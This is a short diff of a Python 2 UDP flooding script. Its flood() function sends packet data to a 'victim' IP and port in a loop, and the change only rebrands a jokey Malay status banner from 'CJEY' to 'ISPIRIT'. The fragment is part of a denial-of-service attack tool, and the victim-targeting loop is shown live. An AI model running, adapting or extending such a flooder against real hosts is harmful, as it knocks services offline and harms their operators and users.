@@ -52,7 +52,7 @@ def flood(victim, vport, duration):
         elif int(vport) == 7784:
             client.sendto(Data[7], (victim, int(vport)))
         sent = sent + 1
-        print " CJEY SEND ROTI CANAI TO IP %s DAN MEMBERIKAN TEH TARIK KE PORT %s SEBANYAK %s KALI!! "%(victim, vport, sent)
+        print " ISPIRIT SEND ROTI CANAI TO IP %s DAN MEMBERIKAN TEH TARIK KE PORT %s SEBANYAK %s KALI!! "%(victim, vport, sent)
 
 def main():
     print len(sys.argv)
